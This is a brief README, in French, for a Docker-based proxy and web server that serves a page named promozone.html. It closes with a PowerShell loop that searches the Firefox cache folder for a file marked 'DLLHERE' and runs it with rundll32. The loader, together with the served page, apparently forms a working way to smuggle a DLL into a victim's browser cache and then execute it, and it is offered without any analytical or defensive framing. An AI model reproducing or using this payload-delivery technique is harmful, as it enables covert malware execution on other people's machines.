# Deployment

Le container deploie un proxy et un server qui expose le fichier promozone.html. 

Le proxy ajoute un header a la requete.


# Fonctionnement

Pour lancer le container :
```bash
docker-compose up -d
```

Pour stopper le container
```bash
docker-compose down
```


# Code pour rechercher la dll

```ps1
foreach($f in @("$env:LOCALAPPDATA\Mozilla\Firefox\Profiles\*.default-release\cache2\entries\")){
    Get-ChildItem $f -Recurse | ForEach-Object {
        if (Select-String -Pattern "DLLHERE" -Path $_.FullName){
            rundll32.exe "$($_.FullName)",DllMain
        }
    }
}
```